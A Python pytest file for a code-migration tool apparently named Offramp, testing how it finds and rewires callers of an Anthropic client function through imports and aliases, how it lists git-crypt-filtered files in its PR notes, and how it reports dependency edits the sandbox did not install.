HEAD = "import anthropic\n{imports}\nCLIENT = anthropic.AsyncAnthropic()\n"  # line 2: the import


def handed_problems(
    callers: dict[str, str], site_module: str = SUMMARIZE
) -> tuple[list[str], dict[str, str]]:
    """Offramp's own rewrite of `summarize`, its callers rewired, then conformance with every module: (its
    problems, the rewired modules)."""
    spec = AdapterSpec(system_prompt="P", max_tokens=32, temperature=0.0)
    out, constants, system_name, *_ = _prepare(
        site_module, SUMMARIZE_SITE, spec, ASYNC_PARAMS, 100, client="app.offramp_client"
    )
    sources = {"app/__init__.py": "", "app/summarize.py": out, **callers}
    rewired = rewrite_callers(sources, "app/summarize.py", "summarize", "app.offramp_client")
    shipped = sources | rewired
    site = shipped["app/summarize.py"]
    return conformance(site, SUMMARIZE_SITE, ASYNC_PARAMS, constants, system_name, None, shipped), rewired


@pytest.mark.parametrize(
    ("caller", "shown"),
    [
        (HEAD.format(imports="from app.summarize import summarize as summ")
         + GO.format(call="summ(CLIENT, t)"), "`app/cli.py:7` `summ(...)` hands `CLIENT`"),
        (HEAD.format(imports="import app.summarize as s")
         + GO.format(call="s.summarize(CLIENT, t)"), "`app/cli.py:7` `s.summarize(...)` hands `CLIENT`"),
        (HEAD.format(imports="import app.summarize")
         + GO.format(call="app.summarize.summarize(CLIENT, t)"),
         "`app/cli.py:7` `app.summarize.summarize(...)` hands `CLIENT`"),
        (HEAD.format(imports="from . import summarize as mod")
         + GO.format(call="mod.summarize(CLIENT, t)"), "`app/cli.py:7` `mod.summarize(...)` hands `CLIENT`"),
        (HEAD.format(imports="from .summarize import summarize")
         + GO.format(call="summarize(CLIENT, t)"), "`app/cli.py:7` `summarize(...)` hands `CLIENT`"),
        (HEAD.format(imports="import importlib")
         + GO.format(call='getattr(importlib.import_module("app.summarize"), "summarize")(CLIENT, t)'),
         "`app/cli.py:7` looks up `app.summarize` by name; `app/cli.py:7` looks up `summarize` by name"),
        ("from app.summarize import summarize\nJOBS = {'summarize': summarize}\n",
         "`app/cli.py:2` uses `summarize` without calling it"),
    ],
    ids=["from-import-alias", "module-alias", "dotted-module", "relative-module", "relative-function",
         "getattr-by-name", "stored"],
)  # fmt: skip
def test_every_reference_to_the_function_is_resolved_through_imports_and_must_be_a_known_call(caller, shown):
    """Re-review R2-I1: `from app.summarize import summarize as summ; await summ(CLIENT, t)` shipped, since
    callers were matched by name. References are resolved through each module's imports now."""
    problems, _ = handed_problems({"app/cli.py": caller})

    why = "the client `client` its callers hand `summarize` is not known to be the Token Factory client"
    assert problems == [f"{why}: {shown}"]


def test_a_re_export_through_a_package_init_is_followed():
    init = "from .summarize import summarize as summarise\n"
    caller = "import anthropic\nfrom app import summarise\nCLIENT = anthropic.AsyncAnthropic()\n" + GO.format(
        call="summarise(CLIENT, t)"
    )

    problems, _ = handed_problems({"app/__init__.py": init, "app/cli.py": caller})

    assert problems and problems[0].endswith("`app/cli.py:7` `summarise(...)` hands `CLIENT`")


def test_an_inline_client_through_an_alias_is_rewired_and_an_unrelated_attribute_call_is_no_caller():
    """Re-review R2-I1 (`summ(anthropic.AsyncAnthropic(), t)` was left on the old client) and Concern 2
    (`textlib.summarize(t)` refused the site, and the reason named the wrong expression)."""
    caller = "import anthropic\nimport textlib\nfrom app.summarize import summarize as summ\n" + GO.format(
        call="summ(anthropic.AsyncAnthropic(), textlib.summarize(t)) or obj.summarize()"
    )

    problems, rewired = handed_problems({"app/cli.py": caller})

    assert problems == []
    assert (
        "summ(token_factory_async_client(), textlib.summarize(t)) or obj.summarize()" in rewired["app/cli.py"]
    )
    assert "from app.offramp_client import token_factory_async_client" in rewired["app/cli.py"]


def test_the_sites_own_module_rewires_an_inline_client_and_refuses_a_module_getattr():
    """Re-review R2-m3: an inline client in the module's own `__main__` block sent the site to review. And a
    module `__getattr__` can hand the function out under any name."""
    run = 'print(asyncio.run(summarize(anthropic.AsyncAnthropic(), "x")))'
    main = SUMMARIZE + f'\n\nif __name__ == "__main__":\n    {run}\n'
    problems, rewired = handed_problems({}, main)

    assert problems == []
    assert 'asyncio.run(summarize(token_factory_async_client(), "x"))' in rewired["app/summarize.py"]

    lookup = SUMMARIZE + "\n\ndef __getattr__(name):\n    return summarize\n"
    problems, _ = handed_problems({}, lookup)

    assert "defines a module `__getattr__`, which may hand out `summarize` under any name" in problems[0]


ALIAS_CLI = (
    "from anthropic import Anthropic\n\nfrom tinyapp.greet import greet as say\n\n\n"
    'def main():\n    return say(Anthropic(), "Ana")\n'
)


def test_an_aliased_caller_ships_rewired_and_the_pr_says_how_far_the_caller_check_goes():
    repo = anthropic_tiny("alias-caller", {"tinyapp/cli.py": ALIAS_CLI})

    result = compose_anthropic(repo, "alias-caller-run")

    assert verdict(result, "cs_01").decision == "MIGRATE", verdict(result, "cs_01").reason
    assert 'return say(token_factory_client(), "Ana")' in result.files["tinyapp/cli.py"]
    assert (
        "`greet`, `shout` get the client from callers: callers were checked statically; lookups through "
        "reflection (getattr, importlib, sys.modules, vars/__dict__) were not, except the literal "
        "getattr/import_module forms Offramp refuses"
    ) in result.change_notes


def test_files_left_out_as_filtered_are_listed_in_the_pr_and_where_the_untouched_repo_is_red(monkeypatch):
    """Re-review Concern 3: a git-crypt file was dropped silently, so a test importing it went red with no
    word on why."""
    monkeypatch.delenv(sandbox_module.UNTRACKED_OPT_IN)
    listed = (
        "Offramp left 1 tracked file(s) out of the sandbox, which git filters (a `filter` attribute, such as "
        "git-crypt's; a fresh clone holds them encrypted): `secrets/prod.env`"
    )
    for red in (False, True):
        src = work_dir(f"filtered-{red}") / "src"
        shutil.copytree(TINY, src, ignore=shutil.ignore_patterns(".venv", "__pycache__"))
        git_repo(src, {})

        def box(r, ok=not red):
            return FakeSandbox(r, [ok], precheck=True)

        result = compose_patches(src, tiny_sites(), tiny_verdicts(), tiny_adapters(), patcher_llm(),
                                 work_dir(f"filtered-{red}-run"), config=CONFIG, build_request=BUILD,
                                 sandbox_factory=box)  # fmt: skip

        if red:
            assert verdict(result, "cs_01").reason.endswith(f"; {listed}")
        else:
            assert result.combined == ["cs_01", "cs_03"] and listed in result.change_notes
            assert CANARY not in "".join(result.change_notes)  # paths only, never content


@pytest.mark.parametrize(
    ("files", "direct"),
    [
        ({"examples/requirements.txt": "anthropic\n"}, False),
        ({"requirements.txt": "anthropic\n"}, True),
        ({"pyproject.toml": "[project]\nname = 'x'\n", "requirements.txt": "anthropic\n"}, False),
        ({"pyproject.toml": "[project]\nname = 'x'\ndependencies = ['anthropic']\n"}, True),
    ],
    ids=["example-folder", "root-requirements", "requirements-beside-a-pyproject", "pyproject"],
)
def test_only_the_declaration_the_image_installs_is_a_direct_one(tmp_path, files, direct):
    """Re-review nit: `examples/requirements.txt` declaring anthropic added the openai layer."""
    for path, text in files.items():
        (tmp_path / path).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / path).write_text(text)

    assert declare_openai(tmp_path, {"anthropic"})[2] is direct


# ---------------------------------------------------------------- round 4: what the checks did not install


@pytest.mark.parametrize(
    ("files", "note"),
    [
        ({"pyproject.toml": "[project]\nname = 'x'\n", "api/requirements.txt": "anthropic\n"},
         "`api/requirements.txt` gains `openai>=1.50`; the checks ran on the environment from "
         "`pyproject.toml`, which does not install that file"),
        ({"api/requirements.txt": "anthropic\n"},
         "`api/requirements.txt` gains `openai>=1.50`; the checks ran without it: the sandbox image installs "
         "no dependency file"),
        ({"requirements.txt": "anthropic\n"}, None),
    ],
    ids=["beside-a-pyproject", "no-installed-file", "the-installed-file"],
)  # fmt: skip
def test_a_dependency_edit_the_sandbox_did_not_install_is_named_in_the_pr(tmp_path, files, note):
    """Re-review 3 R3-m2: on idea-reality-mcp the edit lands in `api/requirements.txt`, while the image
    installs `pyproject.toml` and `uv.lock`, so the checks never saw it."""
    for path, text in files.items():
        (tmp_path / path).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / path).write_text(text)

    edits, notes, _ = declare_openai(tmp_path, {"anthropic"})

    assert len(edits) == 1
    assert [n for n in notes if " gains `openai>=1.50`; the checks " in n] == ([note] if note else [])
